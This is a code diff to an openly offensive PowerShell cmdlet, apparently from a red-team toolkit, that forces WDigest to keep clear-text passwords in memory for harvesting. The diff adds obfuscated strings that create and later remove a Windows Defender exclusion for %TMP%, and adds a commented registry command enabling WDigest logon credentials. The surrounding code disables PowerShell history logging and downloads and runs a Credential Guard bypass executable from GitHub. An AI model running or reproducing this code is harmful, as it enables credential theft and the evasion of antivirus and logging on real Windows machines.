@@ -8,7 +8,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: Administrator privileges
    Optional Dependencies: WDigest, BypassCredGuard.exe
-   PS cmdlet Dev version: v3.5.19
+   PS cmdlet Dev version: v3.5.20
    
 .DESCRIPTION
    WDigest stores clear-text passwords in memory. An adversary can use a tool like
@@ -138,7 +138,7 @@ If($Banner -iMatch "^(true)$")
    Start-Sleep -Milliseconds 500
 }
 
-$CmdletVersion = "v3.5.19"
+$CmdletVersion = "v3.5.20"
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 If(-not($DebugMe.IsPresent)){$ErrorActionPreference = "SilentlyContinue"}
@@ -222,8 +222,9 @@ If((Get-MpComputerStatus).RealTimeProtectionEnabled -Match '^(True)$')
    {
       write-host "  - " -ForegroundColor Yellow -NoNewline
       write-host "Create defender %TMP% exclusion"
-      iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1" -OutFile "$Env:TMP\Invoke-Exclusions.ps1";
-      Start-Process -WindowStyle Hidden powershell -ArgumentList "-file Invoke-Exclusions.ps1 -Action add -Type ExclusionPath -Exclude $Env:TMP" -Wait
+      $CmdLime = "S@t-MpPr@f@r@nc@ -@xclusionPath" -replace '@','e'
+      Start-Process -WindowStyle Hidden powershell -ArgumentList "$CmdLime '$Env:TMP' -Force" -Wait
+
    }
 }
 
@@ -233,6 +234,7 @@ If($Wdigest -Match '^(true)$')
    write-host "  - " -ForegroundColor Yellow -NoNewline
    write-host "Patching Wdigest.dll in Memory`n"
    ## Download (from my github) and Execute the binary.exe
+   # reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d '1' /f|Out-Null
    iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/BypassCredGuard.exe" -OutFile "BypassCredGuard.exe"|Unblock-File
 
    Try{
@@ -441,8 +443,8 @@ If((Get-MpComputerStatus).RealTimeProtectionEnabled -Match '^(True)$')
       write-host "%TMP%" -ForegroundColor Red -NoNewline
       write-host "' exclusion from windows defender."
 
-      Start-Process -WindowStyle Hidden powershell -ArgumentList "-file Invoke-Exclusions.ps1 -Action del -Type ExclusionPath -Exclude $Env:TMP" -Wait;
-      Remove-Item -Path "$Env:TMP\Invoke-Exclusions.ps1" -Force
+      $CmdLime = "R@mov@-MpPr@f@r@nc@ -@xclusionPath" -replace '@','e'
+      Start-Process -WindowStyle Hidden powershell -ArgumentList "$CmdLime '$Env:TMP' -Force" -Wait
    }
 }
 
